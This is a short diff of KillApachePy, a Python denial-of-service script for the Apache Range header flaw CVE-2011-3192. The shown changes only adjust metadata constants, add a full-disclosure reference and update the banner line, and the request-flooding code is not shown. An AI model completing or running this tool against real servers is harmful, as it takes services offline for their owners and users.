@@ -2,11 +2,12 @@
 
 import optparse, os, socket, threading, time
 
-NAME    = "KillApachePy (Range Header DoS CVE-2011-3192)"
-VERSION = "0.1b"
-AUTHOR  = "Miroslav Stampar (http://unconciousmind.blogspot.com | @stamparm)"
-LICENSE = "Public domain (FREE)"
-ABOUT   = "You'll typically have to wait for 10-20 iterations before first connection timeouts"
+NAME        = "KillApachePy (Range Header DoS CVE-2011-3192)"
+VERSION     = "0.1b"
+AUTHOR      = "Miroslav Stampar (http://unconciousmind.blogspot.com | @stamparm)"
+LICENSE     = "Public domain (FREE)"
+SHORT       = "You'll typically have to wait for 10-20 iterations before first connection timeouts"
+REFERENCE   = "http://seclists.org/fulldisclosure/2011/Aug/175"
 
 SLEEP_TIME = 5          # time to wait for new thread slots (after max number reached)
 RECV_SIZE = 100         # receive buffer size in testing mode
@@ -75,7 +76,7 @@ def attack(target):
             os._exit(1)
 
 if __name__ == "__main__":
-    print "%s #v%s\n by: %s\n\n(%s)\n" % (NAME, VERSION, AUTHOR, ABOUT)
+    print "%s #v%s\n by: %s\n\n(%s)\n" % (NAME, VERSION, AUTHOR, SHORT)
     parser = optparse.OptionParser(version=VERSION, option_list=[optparse.make_option("-t", dest="target", help="Target (e.g. \"www.target.com\")")])
     options, _ = parser.parse_args()
     if options.target:
